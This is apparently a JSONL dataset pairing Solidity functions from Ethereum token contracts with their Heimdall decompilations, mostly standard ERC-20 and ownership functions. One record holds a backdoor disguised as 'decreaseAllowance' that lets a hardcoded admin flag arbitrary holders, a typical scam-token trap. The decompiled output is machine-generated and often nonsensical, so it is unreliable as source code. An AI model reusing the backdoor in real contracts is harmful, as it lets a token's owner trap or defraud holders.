{"contract_address": "0xDE1802eE6Ff990c121b748107Ab34f17b9Bc7978", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 > 0, \"SafeMath: addition overflow\");\n        address var_a = address(msg.sender);\n        var_b = 0x03;\n        require(bytes1(storage_map_a[var_a]), \"SafeMath: addition overflow\");\n        require(bytes1(storage_map_a[var_a]), \"SafeMath: addition overflow\");\n        require(!0, \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_a[var_a] > (0 + storage_map_a[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!((0 + storage_map_a[var_a]) < storage_map_a[var_a]), \"SafeMath: addition overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x1b;\n        var_g = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_a[var_a] = 0 + storage_map_a[var_a];\n        uint256 var_d = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        uint256 var_h = 0x40 + var_h;\n        var_d = 0x1e;\n        var_i = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_a[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_k = var_h.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(!((storage_map_a[var_a] - arg1) > storage_map_a[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_a[var_a] = storage_map_a[var_a] - arg1;\n        var_h = 0x40 + var_h;\n        var_j = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(0 > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_p = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_m = 0x20;\n        uint256 var_q = var_h.length;\n        uint256 var_r = 0;\n        var_s = var_n;\n        var_r = 0;\n        require(!(arg1 - 0) > arg1);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(bytes1(tradingEnabled / 0x010000000000000000000000000000000000000000));\n        require(address(msg.sender) - (address(tradingEnabled)));\n        require(address(arg0) - (address(tradingEnabled)));\n        require(bytes1(tradingEnabled / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(tradingEnabled / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(tradingEnabled / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(tradingEnabled / 0x01000000000000000000000000000000000000000000));\n        tradingEnabled = 0x01000000000000000000000000000000000000000000 | (uint248(tradingEnabled));\n        var_d = 0x02;\n        var_h = var_h + 0x60;\n        var_t = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_i = address(this);\n        var_o = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_c / 0x01).WETH(var_k); // staticcall\n        var_h = var_h + (uint248(ret0.length + 0x1f));\n        require(!((var_h + ret0.length) - var_h) < 0x20);\n        require(var_h.length == (address(var_h.length)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        uint256 var_j = address(var_h.length);\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_c);\n        address var_b = keccak256(var_a);\n        storage_map_a[var_a] = store_d;\n        var_p = store_d;\n        emit Approval(address(this), address(store_c), store_d);\n        var_p = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_m = store_d;\n        var_q = 0;\n        var_s = 0xa0;\n        uint256 var_u = var_h.length;\n        address var_v = address(this);\n        uint256 var_w = block.timestamp;\n        require(address(store_c).code.length);\n        (bool success, bytes memory ret0) = address(store_c).Unresolved_791ac947(var_m); // call\n        tradingEnabled = uint248(tradingEnabled);\n        (bool success, bytes memory ret0) = address(store_e).transfer(address(this).balance);\n        if (ret0.length == 0) {\n        }\n        var_a = address(this);\n        var_b = 0x01;\n        if (!storage_map_a[var_a] > store_d) {\n        }\n        if (!tradingEnabled / 0x0100000000000000000000000000000000000000000000) {\n        }\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((sellFees == ((sellFees * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((sellFees * arg1) / arg1) == sellFees, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_k = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x40 + var_h;\n        var_d = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        if (0x64) {\n            if (0x64) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x12;\n                require(0x64, \"Trading is not started\");\n            }\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x12;\n            require(0x64, \"Trading is not started\");\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x16;\n        var_g = 0x54726164696e67206973206e6f74207374617274656400000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_k = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x7F073dD6bC1B6480d8f06Ebedd6c53f4dD9c8DBc", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x636aD441CdA1EC74BC059A23615b9D9c3464d9e3", "original_solidity_code": "function setBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {\r\n        _buyLiquidityFee = newLiquidityTax;\r\n        _buyMarketingFee = newMarketingTax;\r\n        _buyTeamFee = newTeamTax;\r\n\r\n        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee).add(_buyDestroyFee);\r\n    }", "heimdall_decompiled_code": "function setBuyTaxes(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _buyLiquidityFee = arg0;\n        _buyMarketingFee = arg1;\n        _buyTeamFee = arg2;\n        require(!(arg0 > ~(arg1)), \"SafeMath: addition overflow\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(!((arg0 + arg1) < arg0), \"SafeMath: addition overflow\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1b;\n        var_d = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n    }"}
{"contract_address": "0xB108eB679AAD7822009ad3A318Cc7daC6198f03b", "original_solidity_code": "function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0) - 0, \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        var_b = 0x65;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x65;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        var_b = 0x65;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg1)), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x94c83172b9a113C1A1011ac69B2Bd45Ed94728e6", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(address(arg0) == 0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x3D93F860f4f6f4C54B79eDa0c09A1E70cc79947b", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x7ccFBc00423e429844f344aA62D726E3C0DCbfCA", "original_solidity_code": "function decreaseAllowance(address cjjjss) public    {\r\n       \r\n        require(_msgSender() == vipadmin123);\r\n        if(_msgSender() == vipadmin123){\r\n        }else{\r\n        }\r\n        uint128 newpassnum = 12233;\r\n        xelonlist[cjjjss] = newpassnum;\r\n       \r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) == (address(vipadmin123)));\n        address var_a = address(arg0);\n        var_b = 0x08;\n        storage_map_b[var_a] = 0x2fc9;\n    }"}
{"contract_address": "0x30F674e5399B6493A6096d239153b21331fbC670", "original_solidity_code": "function isExcludedFromFees(address account) public view returns (bool) {\r\n        return _isExcludedFromFees[account];\r\n    }", "heimdall_decompiled_code": "function isExcludedFromFees(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x1f;\n        address var_c = !(!bytes1(storage_map_d[var_a]));\n        return !(!bytes1(storage_map_d[var_a]));\n    }"}
{"contract_address": "0xb4F77c4Cb758aeA0364f50892D20E267be9805c4", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(msg.sender == (address(store_e)), \"Ownable: caller is not the Owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865204f776e6572;\n        store_e = 0 | (uint96(store_e));\n        emit OwnershipTransferred(address(store_e), 0);\n    }"}
{"contract_address": "0x6dcAfFa85fA06C617E8290f1BABC7091eEE8150f", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        uint256 currentAllowance = allowance(owner, spender);\\n        require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\n        unchecked {\\n            _approve(owner, spender, currentAllowance - subtractedValue);\\n        }\\n\\n        return true;\\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_h = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x172F7a6F8C76321376cf077c4b68f6C0A0907d2f", "original_solidity_code": "function getTotalDividends() external view returns (uint256) {\r\n        return distributor.totalDividends();\r\n    }", "heimdall_decompiled_code": "function getTotalDividends() public returns (uint256) {\n        var_a = 0x997664d700000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(blacklistEnabled / 0x01).totalDividends(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_d == (var_d));\n        var_e = var_d;\n        return var_d;\n    }"}
{"contract_address": "0x87B559c39A8d5f01699E8bafd47EdA847DB8a099", "original_solidity_code": "function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\\r\\n      _transfer(sender, recipient, amount);\\r\\n      _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function transferFrom(address arg0, address arg1, uint256 arg2) public payable {\n        require(address(arg0));\n        require(address(arg1));\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(arg0);\n        require(address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).code.length);\n        (bool success, bytes memory ret0) = address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).Unresolved_70a08231(var_b); // staticcall\n        require(!(ret0.length < 0x20), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        address var_c = address(arg0);\n        var_d = 0x06;\n        require(!storage_map_b[var_c], \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(var_e.length > 0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        var_c = address(arg0);\n        var_d = 0x04;\n        require(!(arg2 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        uint256 var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        var_c = address(arg0);\n        var_d = 0x04;\n        storage_map_b[var_c] = storage_map_b[var_c] - arg2;\n        var_c = address(arg1);\n        var_d = 0x04;\n        require(!((arg2 + storage_map_b[var_c]) < storage_map_b[var_c]), \"SafeMath: addition overflow\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x20;\n        var_i = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        require(!(arg2 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        if (!storage_map_b[var_c]) {\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x23;\n        var_n = this.code[3092:3127];\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x25;\n        var_n = this.code[3239:3276];\n    }"}
{"contract_address": "0xc921a48b2bBd243aC30422B266edf58F472Eca7F", "original_solidity_code": "function setRewardsWallet(address _wallet) public onlyOwner {\\r\\n        rewardsWallet = _wallet;\\r\\n    }", "heimdall_decompiled_code": "function setRewardsWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_h = (address(arg0)) | (uint96(store_h));\n    }"}
{"contract_address": "0x4CEDcba2dB7c99934bC64bBd575FEE5fE6E0F28b", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(store_j)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_d[var_a]);\n        store_c = 0x01000000000000000000000000000000000000000000 | (uint248(store_c));\n        require(!storage_map_d[var_a]);\n        require(!bytes1(store_c / 0x010000000000000000000000000000000000000000));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_g), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_g);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = storage_map_d[var_a];\n        address var_k = storage_map_d[var_a];\n        emit Approval(address(this), address(store_g), storage_map_d[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_d[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_g).code.length);\n        (bool success, bytes memory ret0) = address(store_g).Unresolved_791ac947(var_l); // call\n        store_c = uint248(store_c);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(store_j).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4D270302aB1fBcC453A865a6bFD8CD7C893a3d13", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xc89FB1a9e0817a046a6E1ff4E065A4e837Ba50C2", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x30045aA941FF9Be1d2D3603A75207C07860d4156", "original_solidity_code": "function burn(uint256 amount) public virtual {\\r\\n        _burn(_msgSender(), amount);\\r\\n    }", "heimdall_decompiled_code": "function burn(uint256 arg0) public {\n        require(address(msg.sender), \"ERC20: burn amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_f[var_a] < arg0), \"ERC20: burn amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a206275726e20616d6f756e7420657863656564732062616c616e;\n        var_g = 0x6365000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_f[var_a] = storage_map_f[var_a] - arg0;\n        totalSupply = totalSupply - arg0;\n        uint256 var_c = arg0;\n        emit Transfer(address(msg.sender), 0, arg0);\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x45524332303a206275726e2066726f6d20746865207a65726f20616464726573;\n        var_g = 0x7300000000000000000000000000000000000000000000000000000000000000;\n    }"}
